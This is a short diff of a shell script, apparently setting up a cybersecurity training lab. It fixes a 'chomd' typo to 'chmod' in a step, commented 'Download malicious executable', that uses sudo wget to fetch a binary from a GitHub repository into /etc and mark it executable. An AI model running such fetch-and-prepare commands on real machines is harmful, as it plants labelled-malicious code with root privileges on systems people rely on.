@@ -3,7 +3,7 @@
 #Download malicious executable
 cd /etc
 sudo wget "https://github.com/acebird/CyberforceLabs/raw/refs/heads/main/executable"
-sudo chomd +x executable
+sudo chmod +x executable
 
 #Install and run dizquetv
 cd /etc
